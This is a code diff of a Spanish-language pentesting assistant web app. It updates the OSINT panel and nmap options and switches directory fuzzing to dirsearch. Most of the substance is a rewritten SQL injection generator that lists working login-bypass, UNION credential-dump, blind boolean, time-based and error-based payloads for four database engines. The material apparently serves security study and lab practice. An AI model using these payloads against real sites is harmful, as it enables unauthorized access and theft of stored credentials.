@@ -283,6 +283,9 @@ tr.svc-open-row td{background:rgba(0,170,255,.08);}
 .svc-whatis{font-size:12px;color:var(--text2);line-height:1.55;margin-bottom:12px;background:var(--bg3);border-left:2px solid var(--cyan);border-radius:var(--r);padding:7px 10px;}
 .svc-lbl{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);margin:10px 0 6px;}
 .enum-note{background:rgba(255,204,0,.06);border:1px solid rgba(255,204,0,.25);border-radius:var(--r);padding:7px 10px;font-size:11px;color:var(--yellow);margin-top:4px;}
+/* Nota informativa (azul) — para explicaciones/metodología, no avisos */
+.enum-note-info{background:rgba(0,170,255,.06);border:1px solid rgba(0,170,255,.28);border-radius:var(--r);padding:7px 10px;font-size:11px;color:var(--text2);margin-top:4px;}
+.enum-note-info b{color:var(--blue);}
 .enum-danger-note{background:rgba(255,51,68,.06);border:1px solid rgba(255,51,68,.25);border-radius:var(--r);padding:7px 10px;font-size:11px;color:var(--red);margin-top:4px;}
 .enum-nmap-section{margin-bottom:20px;}
 .enum-nmap-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px;}
@@ -293,7 +296,7 @@ tr.svc-open-row td{background:rgba(0,170,255,.08);}
 .enum-toggle{display:flex;align-items:center;gap:5px;cursor:pointer;font-size:11px;font-family:var(--mono);color:var(--text2);background:var(--bg3);border:1px solid var(--border);border-radius:var(--r);padding:4px 9px;user-select:none;transition:all .12s;}
 .enum-toggle.active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,221,255,.07);}
 .enum-phase-cmd{margin-bottom:10px;}
-.enum-phase-lbl{font-size:9px;font-family:var(--mono);font-weight:700;letter-spacing:1px;color:var(--text3);margin-bottom:4px;text-transform:uppercase;}
+.enum-phase-lbl{font-size:11px;font-family:var(--mono);font-weight:700;letter-spacing:.5px;color:var(--cyan);margin-bottom:6px;text-transform:uppercase;border-left:3px solid var(--cyan);padding-left:8px;}
 .enum-service-table{width:100%;border-collapse:collapse;font-size:11px;font-family:var(--mono);}
 .enum-service-table th{background:var(--bg3);color:var(--text3);padding:6px 10px;text-align:left;font-size:10px;border-bottom:1px solid var(--border);}
 .enum-service-table td{padding:6px 10px;border-bottom:1px solid var(--border);color:var(--text2);}
@@ -710,12 +713,14 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
           ☣ MalwareBazaar <span class="needs-key">API</span>
         </button>
 
-        <div class="sb-section" style="padding:8px 10px 4px;font-size:9px;color:var(--text3);letter-spacing:1px;margin-top:4px;">HISTORIAL</div>
+        <div class="sb-section" style="padding:8px 10px 4px;font-size:9px;color:var(--text3);letter-spacing:1px;margin-top:4px;display:flex;align-items:center;justify-content:space-between;">HISTORIAL
+          <button onclick="clearOsintHistory()" title="Vaciar historial" style="background:none;border:none;color:var(--red);cursor:pointer;font-size:10px;padding:0;font-family:var(--mono);">🗑 Limpiar</button>
+        </div>
         <div id="osintHistoryList" style="font-size:10px;color:var(--text3);padding:0 6px;"></div>
       </div>
       <div class="osint-main">
         <div class="osint-query-bar">
-          <input type="text" id="osintQuery" placeholder="" autocomplete="off" onkeydown="if(e&&e.key==='Enter')runOsint()">
+          <input type="text" id="osintQuery" placeholder="" autocomplete="off" onkeydown="if(event.key==='Enter')runOsint()">
           <button class="btn-ai" onclick="runOsint()" id="btnOsint">▶ Ejecutar</button>
           <button class="btn-outline" onclick="clearOsintResult()">✕</button>
         </div>
@@ -878,6 +883,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
             <tr><td>Linux / Unix</td><td>64</td></tr>
             <tr><td>macOS</td><td>64</td></tr>
             <tr><td>Windows</td><td>128</td></tr>
+            <tr><td>Solaris / AIX</td><td>255</td></tr>
             <tr><td>Router / Switch Cisco</td><td>255</td></tr>
           </tbody>
         </table>
@@ -937,14 +943,16 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
           <div class="enum-gen-row">
             <span class="enum-gen-label">Velocidad</span>
             <select class="enum-gen-sel" id="nmapSpeed" onchange="buildNmapCmd()">
-              <option value="1000">Silencioso (--min-rate 1000)</option>
-              <option value="3000">Normal (--min-rate 3000)</option>
-              <option value="5000" selected>Rápido (--min-rate 5000)</option>
+              <option value="-T2">Sigiloso (-T2)</option>
+              <option value="-T3" selected>Equilibrado (-T3, por defecto)</option>
+              <option value="-T4">Agresivo (-T4)</option>
             </select>
           </div>
           <div class="enum-gen-row">
             <span class="enum-gen-label">Flags fase 1</span>
             <div class="enum-toggle-row" style="margin:0;">
+              <label class="enum-toggle" id="tgl-p" onclick="toggleEnumFlag('p')" title="Escanea los 65535 puertos (sin él, solo los 1000 más comunes)">-p-</label>
+              <label class="enum-toggle" id="tgl-minrate" onclick="toggleEnumFlag('minrate')" title="Fuerza un mínimo de 5000 paquetes/segundo (ritmo garantizado, más ruidoso)">--min-rate 5000</label>
               <label class="enum-toggle" id="tgl-pn" onclick="toggleEnumFlag('pn')">-Pn</label>
               <label class="enum-toggle" id="tgl-v" onclick="toggleEnumFlag('v')">-v</label>
             </div>
@@ -956,7 +964,7 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
               <button class="enum-copy-btn" onclick="enumCopy(this,document.getElementById('nmapCmd1').textContent)">⎘ Copiar</button>
             </div>
           </div>
-          <div style="border-top:1px solid var(--border);padding-top:10px;margin-top:4px;">
+          <div style="border-top:1px solid var(--border2);padding-top:16px;margin-top:18px;">
             <div class="enum-gen-row">
               <span class="enum-gen-label">Puertos abiertos</span>
               <input type="text" class="enum-gen-input" id="nmapPorts" placeholder="21,22,80,443..." oninput="onNmapPortsChanged()">
@@ -977,9 +985,6 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
                 <code id="nmapCmd2" style="word-break:break-all;flex:1;color:var(--text3);">Introduce puertos de la Fase 1 para generar este comando</code>
                 <button class="enum-copy-btn" id="nmapCmd2copy" onclick="enumCopy(this,document.getElementById('nmapCmd2').textContent)" disabled>⎘ Copiar</button>
               </div>
-            </div>
-            <div style="margin-top:8px;text-align:right;">
-              <button class="btn-outline" style="font-size:11px;color:var(--purple);border-color:rgba(170,85,255,.4);" onclick="saveNmapResult(this)">💾 Guardar resultado como nota</button>
             </div>
           </div>
         </div>
@@ -1200,8 +1205,8 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
               <li data-n="4">Información en phpinfo.php, robots.txt, .git/</li>
             </ul>
               <div class="svc-lbl">Comandos</div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ffuf -u http://IP/FUZZ -w /usr/share/dirb/wordlists/common.txt -c</div><button class="enum-copy-btn" onclick="enumCopy(this,'ffuf -u http://IP/FUZZ -w /usr/share/dirb/wordlists/common.txt -c')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuzzing básico de directorios</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c</div><button class="enum-copy-btn" onclick="enumCopy(this,'ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuzzing con SecLists (más completo)</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">dirsearch -u http://IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'dirsearch -u http://IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuzzing de directorios con la wordlist por defecto. Sirven igual <b>gobuster</b>, <b>feroxbuster</b> o <b>ffuf</b> — hacen lo mismo.</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">dirsearch -u http://IP -e php,html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</div><button class="enum-copy-btn" onclick="enumCopy(this,'dirsearch -u http://IP -e php,html,txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt')">⎘ Copiar</button></div><div class="enum-cmd-desc">Con extensiones y SecLists (más completo)</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
             <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nikto -h http://IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nikto -h http://IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Escáner automático de vulnerabilidades web</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
             <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">curl -I http://IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'curl -I http://IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Ver cabeceras HTTP — versión del servidor</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
             <div class="enum-note">🔍 Siempre revisar manualmente: <code style="color:var(--orange)">/robots.txt</code> · <code style="color:var(--orange)">/phpinfo.php</code> · <code style="color:var(--orange)">/.git/</code></div>
@@ -2495,6 +2500,30 @@ const OSINT_PARAM={
   'hash-vt':'hash', abuseipdb:'ip', malwarebazaar:'hash',
 };
 
+// Descripción corta de cada herramienta (se muestra al seleccionarla, antes de ejecutar)
+const OSINT_DESC={
+  whois:'WHOIS del dominio: registrador, fechas de creación/expiración, nameservers y contactos públicos.',
+  dns:'Registros DNS del dominio (A, AAAA, MX, NS, TXT…).',
+  subdomains:'Descubre subdominios del dominio a partir de fuentes públicas (crt.sh y otras).',
+  ssl:'Certificado SSL/TLS del dominio: emisor, validez y dominios que cubre (SANs).',
+  wayback:'Copias históricas de la URL en Wayback Machine (archive.org).',
+  dmarc:'Políticas DMARC y SPF del dominio (protección anti-suplantación de email).',
+  robots:'Lee el robots.txt del sitio: rutas que pide no indexar (a veces revela directorios interesantes).',
+  ip:'Geolocalización y datos de una IP: país, ISP/organización y ASN.',
+  'reverse-dns':'DNS inverso (PTR): el nombre de host asociado a una IP.',
+  shodan:'Busca la IP/host en Shodan: puertos, servicios y banners expuestos a internet.',
+  'email-verify':'Comprueba si un email es válido (formato, registro MX y respuesta SMTP) y, de paso, si aparece en filtraciones (HIBP).',
+  hibp:'Have I Been Pwned: si un email o dominio aparece en filtraciones de datos conocidas.',
+  hunter:'Hunter.io: emails públicos asociados a un dominio y su patrón.',
+  leakradar:'LeakRadar: busca credenciales o datos filtrados de un email o dominio.',
+  headers:'Cabeceras HTTP de una URL: servidor, tecnología y cabeceras de seguridad.',
+  urlscan:'urlscan.io: busca escaneos públicos ya hechos de una URL o dominio (veredicto, página y recursos).',
+  virustotal:'VirusTotal: reputación de un dominio, IP, URL o hash (detecciones de motores AV).',
+  'hash-vt':'VirusTotal por hash: reputación de un fichero (MD5/SHA1/SHA256).',
+  abuseipdb:'AbuseIPDB: reputación de una IP según reportes de abuso (spam, ataques…).',
+  malwarebazaar:'MalwareBazaar: busca un hash entre muestras de malware conocidas.',
+};
+
 function selectOsintTool(name,btn){
   S.osintTool=name;
   document.querySelectorAll('.osint-tool-btn').forEach(b=>b.classList.remove('active'));
@@ -2504,7 +2533,11 @@ function selectOsintTool(name,btn){
 }
 
 function clearOsintResult(){
-  document.getElementById('osintBody').innerHTML=`<div style="text-align:center;padding:50px;color:var(--text3);font-family:var(--mono);font-size:12px;"><div style="font-size:32px;margin-bottom:10px;opacity:.3;">◎</div>Listo para ejecutar</div>`;
+  const desc=OSINT_DESC[S.osintTool||'whois'];
+  document.getElementById('osintBody').innerHTML=`<div style="text-align:center;padding:40px 16px;color:var(--text3);font-family:var(--mono);font-size:12px;">
+    <div style="font-size:32px;margin-bottom:10px;opacity:.3;">◎</div>
+    ${desc?`<div style="max-width:540px;margin:0 auto 12px;color:var(--text2);font-size:12.5px;line-height:1.6;font-family:var(--sans);">${esc(desc)}</div>`:''}
+    Listo para ejecutar</div>`;
 }
 
 async function runOsint(){
@@ -2979,14 +3012,17 @@ function renderOsintResult(tool,q,data){
 }
 
 async function loadOsintHistory(){
+  const list=document.getElementById('osintHistoryList');
   try{
     const hist=await API.get('/api/osint/history');
-    document.getElementById('osintHistoryList').innerHTML=hist.slice(0,10).map(h=>
+    list.innerHTML=hist.slice(0,10).map(h=>
       `<div class="history-row" onclick='loadOsintHistResult(${h.id},${jarg(h.type)})'>
         <span style="color:var(--text3);font-size:9px">${esc(h.type)}</span><br>${esc(h.query.substring(0,22))}
       </div>`
     ).join('')||'<div style="padding:4px 8px;font-size:10px">Sin historial</div>';
-  }catch(e){}
+  }catch(e){
+    list.innerHTML='<div style="padding:4px 8px;font-size:10px;color:var(--orange)">No se pudo cargar el historial</div>';
+  }
 }
 
 async function loadOsintHistResult(id,tool){
@@ -2994,7 +3030,17 @@ async function loadOsintHistResult(id,tool){
     const data=await API.get('/api/osint/history/'+id);
     if(tool) S.osintTool=tool;
     renderOsintResult(S.osintTool,'(historial)',data);
-  }catch(e){}
+  }catch(e){ setStatus('No se pudo abrir el resultado del historial: '+e.message,'error'); }
+}
+
+// Vacía todo el historial de consultas OSINT.
+async function clearOsintHistory(){
+  if(!confirm('¿Vaciar todo el historial de OSINT?')) return;
+  try{
+    const r=await API.del('/api/osint/history');
+    loadOsintHistory();
+    setStatus('Historial OSINT vaciado'+(r&&r.deleted!=null?(' ('+r.deleted+' entradas)'):''));
+  }catch(e){ setStatus('Error vaciando el historial: '+e.message,'error'); }
 }
 
 // ─── GRAPH ────────────────────────────────────────────────────────────────────
@@ -5118,16 +5164,16 @@ function wvPayloadCard(code, desc){
   </div>`;
 }
 
-// ─── Generador SQLi (motor de BD + categorías, blind y enumeración) ───────────
-const SQLI_CATS=[
-  {id:'detect',      label:'Detección'},
-  {id:'fingerprint', label:'¿Qué BD es?'},
-  {id:'login',  label:'Bypass login'},
-  {id:'union',  label:'UNION'},
-  {id:'enum',   label:'Enumeración BD'},
-  {id:'bool',   label:'Blind booleano'},
-  {id:'time',   label:'Blind time'},
-];
+// ─── Generador SQLi — asistente por fases (detectar → tipo → columnas → explotar) ─
+// Los 4 tipos de SQLi. error y union son in-band (el dato vuelve por la respuesta
+// normal: en las filas mostradas -union- o dentro del error -error-); bool y time
+// son blind (se infiere el dato).
+const SQLI_TYPES={
+  union:{label:'UNION-based', tag:'in-band', hint:'ves los datos de la query en la página'},
+  error:{label:'Error-based', tag:'in-band', hint:'no ves datos, pero la app muestra errores SQL'},
+  bool: {label:'Blind booleano', tag:'blind', hint:'la respuesta cambia con verdadero/falso, sin ver datos'},
+  time: {label:'Blind time', tag:'blind', hint:'solo lo notas por el retardo (ni datos ni errores)'},
+};
 const SQLI_DB={
   mysql:   {name:'MySQL/MariaDB', c:'-- -', ver:'@@version',  timeInj:"' AND SLEEP(5)-- -"},
   mssql:   {name:'MSSQL',         c:'--',   ver:'@@version',  timeInj:"'; WAITFOR DELAY '0:0:5'--"},
@@ -5135,7 +5181,7 @@ const SQLI_DB={
   oracle:  {name:'Oracle',        c:'--',   ver:'banner',     timeInj:"' AND 1=dbms_pipe.receive_message('a',5)--"},
 };
 function sqliPayloads(dbms, cat){
-  const db=SQLI_DB[dbms]||SQLI_DB.mysql; const c=db.c, v=db.ver;
+  const db=SQLI_DB[dbms]||SQLI_DB.mysql; const c=db.c;
   switch(cat){
     case 'detect': return [
       {code:"'",              d:'Comilla simple — si da error SQL o cambia la respuesta, es candidato'},
@@ -5147,9 +5193,6 @@ function sqliPayloads(dbms, cat){
       {code:"' UNION SELECT @@version-- -",            d:'Si @@version funciona → MySQL o MSSQL (mira el texto que devuelve)'},
       {code:"' UNION SELECT version()-- -",            d:'Si version() funciona → MySQL o PostgreSQL'},
       {code:"' UNION SELECT banner FROM v$version-- ",  d:'Si v$version funciona → Oracle'},
-      {code:"' AND '1'||'1'='11",                      d:"Si la concatenación || da '11' → PostgreSQL u Oracle (en MySQL || es OR lógico)"},
-      {code:"' AND '1'+'1'='11",                       d:'Si la concatenación con + da 11 → MSSQL'},
-      {code:"' AND SLEEP(5)-- -",                      d:'Si tarda ~5s → MySQL (SLEEP). MSSQL usa WAITFOR DELAY; PostgreSQL, pg_sleep()'},
     ];
     case 'login': return [
       {code:`' OR 1=1${c}`,   d:'Condición siempre verdadera y comenta el resto de la query'},
@@ -5157,9 +5200,8 @@ function sqliPayloads(dbms, cat){
       {code:"' OR '1'='1",    d:'Bypass clásico sin comentario — cierra la comilla abierta'},
     ];
     case 'union': return [
-      {code:`' ORDER BY 1${c}`,          d:'Sube el número hasta que dé error: son las columnas de la query'},
-      {code:`' UNION SELECT NULL${c}`,   d:'Añade NULLs hasta que no dé error (mismo nº de columnas)'},
-      {code:`' UNION SELECT ${v},NULL${c}`, d:'Coloca la versión en una columna visible (ajusta los NULLs)'},
+      {code:`' ORDER BY 1${c}`,          d:'Sube el número (1,2,3…) hasta que dé error: ese es el nº de columnas de la query'},
+      {code:`' UNION SELECT NULL${c}`,   d:'Añade NULLs (UNION SELECT NULL,NULL,…) hasta que no dé error: mismo nº de columnas. Las que se muestren son las visibles'},
     ];
     case 'enum': return dbms==='oracle' ? [
       {code:`' UNION SELECT table_name,NULL FROM all_tables${c}`, d:'Listar tablas (Oracle no usa information_schema)'},
@@ -5169,28 +5211,116 @@ function sqliPayloads(dbms, cat){
       {code:`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='usuarios'${c}`, d:'Listar columnas de una tabla'},
       {code:`' UNION SELECT usuario,contrasena FROM usuarios${c}`, d:'Volcar credenciales una vez conoces tabla y columnas'},
     ];
-    case 'bool': return [
-      {code:`' AND SUBSTRING((SELECT ${v}),1,1)='5${c}`, d:'Inferir datos carácter a carácter según la respuesta (Oracle: SUBSTR)'},
-      {code:`' AND (SELECT COUNT(*) FROM information_schema.tables)>10${c}`, d:'Preguntar sí/no sobre la BD observando el cambio de respuesta'},
-    ];
-    case 'time': return [
-      {code:db.timeInj, d:'Si la respuesta tarda ~5s, la inyección es válida (útil cuando no hay salida visible)'},
-    ];
+    case 'bool': return ({
+      mysql:[
+        {code:"' AND ASCII(SUBSTRING((SELECT database()),1,1))>77-- -", d:'Búsqueda binaria del 1er carácter por su código ASCII: ajusta el 77 según responda verdadero/falso (mueve la posición 1,1 para el resto)'},
+        {code:"' AND SUBSTRING((SELECT database()),1,1)='a'-- -", d:'Comparación exacta carácter a carácter'},
+        {code:"' AND (SELECT COUNT(*) FROM information_schema.tables)>50-- -", d:'Pregunta sí/no sobre la BD (nº de tablas) según cambie la respuesta'},
+      ],
+      mssql:[
+        {code:"' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77-- ", d:'Búsqueda binaria del carácter por ASCII (MSSQL)'},
+        {code:"' AND LEN((SELECT TOP 1 name FROM sys.databases))=5-- ", d:'Averigua la longitud del dato antes de extraerlo'},
+      ],
+      postgres:[
+        {code:"' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>77-- ", d:'Búsqueda binaria del carácter por ASCII (PostgreSQL)'},
+        {code:"' AND (SELECT current_database()) LIKE 'a%'-- ", d:'Comprobación por patrón (empieza por…)'},
+      ],
+      oracle:[
+        {code:"' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>77-- ", d:'Búsqueda binaria del carácter por ASCII (Oracle usa SUBSTR)'},
+        {code:"' AND (SELECT user FROM dual) LIKE 'A%'-- ", d:'Comprobación por patrón'},
+      ],
+    })[dbms] || [];
+    case 'time': return ({
+      mysql:[
+        {code:"' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>77, SLEEP(3), 0)-- -", d:'Si el carácter cumple la condición, la respuesta tarda ~3s → extracción por tiempo (mueve la posición y ajusta el 77)'},
+      ],
+      mssql:[
+        {code:"'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases),1,1))>77) WAITFOR DELAY '0:0:3'-- ", d:'MSSQL: WAITFOR DELAY condicional según el carácter'},
+      ],
+      postgres:[
+        {code:"' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT current_database()),1,1))>77) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- ", d:'PostgreSQL: pg_sleep condicional con CASE'},
+      ],
+      oracle:[
+        {code:"' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT user FROM dual),1,1))>77) THEN dbms_pipe.receive_message('a',3) ELSE 1 END FROM dual) IS NOT NULL-- ", d:'Oracle: retardo condicional con dbms_pipe'},
+      ],
+    })[dbms] || [];
+    case 'error': return ({
+      mysql:[
+        {code:"' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -", d:'MySQL: el error XPATH muestra el dato tras el «~». Cambia la subconsulta por lo que quieras leer'},
+        {code:"' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -", d:'MySQL: igual con updatexml — aquí saca la BD actual'},
+      ],
+      mssql:[
+        {code:"' AND 1=CONVERT(int,(SELECT @@version))-- ", d:'MSSQL: el error de conversión a int incluye la versión en el mensaje'},
+        {code:"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))-- ", d:'MSSQL: saca el primer nombre por el error de conversión'},
+      ],
+      postgres:[
+        {code:"' AND 1=CAST((SELECT version()) AS int)-- ", d:'PostgreSQL: el CAST a int falla y el error muestra el texto (la versión)'},
+        {code:"' AND 1=CAST((SELECT current_database()) AS int)-- ", d:'PostgreSQL: la BD actual vía error de CAST'},
+      ],
+      oracle:[
+        {code:"' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- ", d:'Oracle: el error de esta función incluye el dato'},
+        {code:"' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- ", d:'Oracle: el error de resolución incluye el usuario actual'},
+      ],
+    })[dbms] || [];
   }
   return [];
 }
-let _sqliCat='detect';
-function setSqliCat(c){ _sqliCat=c; renderSqliGen(); }
+// Estado del asistente: fase (1-4) y tipo de SQLi elegido.
+let _sqliPhase=1, _sqliType=null;
+function resetSqliGen(){ _sqliPhase=1; _sqliType=null; renderSqliGen(); }
+function setSqliPhase(n){ _sqliPhase=n; renderSqliGen(); }
+function setSqliType(t){ _sqliType=t; _sqliPhase = (t==='union')?3:4; renderSqliGen(); }
+function _sqliNav(n,label){ return `<button onclick="setSqliPhase(${n})" style="margin-top:10px;padding:6px 14px;border-radius:6px;border:1px solid var(--cyan);background:rgba(0,221,255,.1);color:var(--cyan);cursor:pointer;font-family:var(--mono);font-size:11px;">${label}</button>`; }
+function _sqliCards(dbms,cat){ return sqliPayloads(dbms,cat).map(p=>wvPayloadCard(p.code,p.d)).join(''); }
+
 function renderSqliGen(){
   const dbms=document.getElementById('sqliDbms')?.value||'mysql';
-  const btns=document.getElementById('sqliCatBtns');
-  if(btns) btns.innerHTML=SQLI_CATS.map(cat=>`<button class="enum-toggle ${cat.id===_sqliCat?'active':''}" onclick="setSqliCat('${cat.id}')">${esc(cat.label)}</button>`).join('');
   const out=document.getElementById('sqliGenOut');
   if(!out) return;
-  const head=_sqliCat==='fingerprint'
-    ? `<div class="enum-note" style="margin-bottom:8px;">Prueba estos para saber el motor. Cuando lo identifiques, selecciónalo arriba en «Motor de BD» y las demás categorías se adaptan a su sintaxis.</div>`
-    : '';
-  out.innerHTML=head+sqliPayloads(dbms,_sqliCat).map(p=>wvPayloadCard(p.code,p.d)).join('');
+
+  // Stepper de las 4 fases (la 3, columnas, solo aplica a UNION)
+  const steps=[[1,'Detectar'],[2,'Tipo'],[3,'Columnas'],[4,'Explotar']];
+  const stepper=`<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap;">`+steps.map(([n,lbl])=>{
+    // Bloqueadas hasta elegir tipo (Fase 2): Columnas (3) y Explotar (4). Columnas
+    // solo aplica a UNION, así que con un tipo blind/error queda bloqueada como n/a.
+    let locked=false, suffix='';
+    if(n===3){ locked = _sqliType!=='union'; if(!_sqliType) suffix=' 🔒'; }
+    if(n===4){ locked = !_sqliType; if(!_sqliType) suffix=' 🔒'; }
+    const act=n===_sqliPhase;
+    const ttl = locked && !_sqliType ? ' title="Elige primero el tipo en la Fase 2"' : '';
+    return `<button onclick="setSqliPhase(${n})" ${locked?'disabled':''}${ttl} style="flex:1;min-width:82px;font-size:10px;font-family:var(--mono);padding:5px 6px;border-radius:6px;cursor:${locked?'not-allowed':'pointer'};border:1px solid ${act?'var(--cyan)':'var(--border)'};background:${act?'rgba(0,221,255,.12)':'var(--bg3)'};color:${locked?'var(--text3)':act?'var(--cyan)':'var(--text2)'};opacity:${locked?.5:1};">${n}. ${lbl}${suffix}</button>`;
+  }).join('')+`</div>`;
+
+  let body='';
+  if(_sqliPhase===1){
+    body=`<div class="enum-note-info" style="margin-bottom:8px;">Confirma que hay inyección. Según cómo reaccione ya intuyes el tipo: <b>error SQL</b> → error-based · <b>ves la salida</b> de la query → UNION · <b>respuesta distinta</b> verdadero/falso (sin ver datos) → blind booleano · <b>retardo</b> con el sleep → blind por tiempo.</div>`
+      + _sqliCards(dbms,'detect')
+      + wvPayloadCard(SQLI_DB[dbms].timeInj,'Con retardo confirmas la SQLi Y, de paso, que es blind por tiempo')
+      + _sqliNav(2,'Elegir el tipo →');
+  } else if(_sqliPhase===2){
+    body=`<div class="enum-note-info" style="margin-bottom:8px;">¿Cómo te vuelve el dato? Elige el tipo y el flujo se adapta. <b>UNION</b> y <b>error-based</b> son in-band; <b>booleano</b> y <b>tiempo</b> son blind.</div>`
+      + Object.entries(SQLI_TYPES).map(([id,t])=>`<button onclick="setSqliType('${id}')" style="display:block;width:100%;text-align:left;margin-bottom:6px;padding:9px 12px;border-radius:6px;border:1px solid ${_sqliType===id?'var(--cyan)':'var(--border2)'};background:var(--bg3);color:var(--text);cursor:pointer;">
+        <span style="font-family:var(--mono);font-size:12px;font-weight:700;color:var(--cyan);">${t.label}</span>
+        <span style="font-size:9px;color:var(--text3);border:1px solid var(--border);border-radius:8px;padding:1px 6px;margin-left:6px;">${t.tag}</span>
+        <div style="font-size:11px;color:var(--text3);margin-top:2px;">${t.hint}</div></button>`).join('');
+  } else if(_sqliPhase===3){
+    body=_sqliType==='union'
+      ? `<div class="enum-note-info" style="margin-bottom:8px;">Averigua cuántas columnas devuelve la query (para que el UNION cuadre) y cuáles se ven en la página.</div>`+_sqliCards(dbms,'union')+_sqliNav(4,'Explotar →')
+      : `<div class="enum-note-info">El nº de columnas solo hace falta para UNION. Con «${SQLI_TYPES[_sqliType]?.label||'este tipo'}» ve directo a Explotar.</div>`+_sqliNav(4,'Explotar →');
+  } else if(_sqliPhase===4){
+    if(!_sqliType) body=`<div class="enum-note-info">Primero elige el tipo en la Fase 2.</div>`+_sqliNav(2,'← Elegir tipo');
+    else if(_sqliType==='union') body=`<div class="enum-note-info" style="margin-bottom:8px;">Identifica el motor y enumera: tablas → columnas → volcado.</div>`
+      +`<div class="svc-lbl" style="margin:6px 0;">Fingerprint del motor</div>`+_sqliCards(dbms,'fingerprint')
+      +`<div class="svc-lbl" style="margin:10px 0 6px;">Enumeración</div>`+_sqliCards(dbms,'enum');
+    else if(_sqliType==='error') body=`<div class="enum-note-info" style="margin-bottom:8px;">Fuerzas errores cuyo texto contenga el dato (sacas un valor por error). Requiere que la app muestre los errores SQL.</div>`+_sqliCards(dbms,'error');
+    else if(_sqliType==='bool') body=`<div class="enum-note-info" style="margin-bottom:8px;line-height:1.6;"><b>Metodología (la misma en todos los motores; solo cambia la sintaxis del payload):</b> no ves el dato, lo <b>deduces por la respuesta</b>. Preguntas «¿el carácter N del dato cumple X?»: si es <b>verdad</b>, la página responde de una forma (la «verdadera»); si es <b>falsa</b>, de otra (cambia el texto, el tamaño o el código HTTP). Lo automatizas con <b>Burp Intruder</b> (o un script): barres cada <b>posición</b> (carácter 1, 2, 3…) y cada <b>valor</b> (búsqueda binaria por su código ASCII), y el que da la respuesta «verdadera» es el correcto. Repites hasta reconstruir todo el dato.</div>`+_sqliCards(dbms,'bool');
+    else if(_sqliType==='time') body=`<div class="enum-note-info" style="margin-bottom:8px;line-height:1.6;"><b>Metodología (la misma en todos los motores; solo cambia la sintaxis del payload):</b> no ves el dato, lo <b>deduces por el retardo</b>. Preguntas «¿el carácter N del dato cumple X?»: si es <b>verdad</b>, la respuesta <b>tarda ~3s</b>; si es <b>falsa</b>, va rápida. Lo automatizas con <b>Burp Intruder</b> (o un script): barres cada <b>posición</b> (carácter 1, 2, 3…) y cada <b>valor</b> (búsqueda binaria por su código ASCII), y el que <b>tarda ~3s</b> es el correcto. Repites hasta reconstruir todo el dato.</div>`+_sqliCards(dbms,'time');
+  }
+  // Bloque independiente: bypass de login (caso aparte del flujo de extracción)
+  const login=`<div style="margin-top:16px;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r);padding:12px;">
+    <div class="svc-lbl" style="margin-bottom:6px;">🔑 Bypass de login — caso aparte</div>
+    <div class="enum-note-info" style="margin-bottom:8px;">No forma parte del flujo de extracción de arriba: sirve para saltarte un formulario de autenticación.</div>`+_sqliCards(dbms,'login')+`</div>`;
+  out.innerHTML=stepper+body+login;
 }
 
 // ─── Generador de webshells PHP (parámetro editable) ──────────────────────────
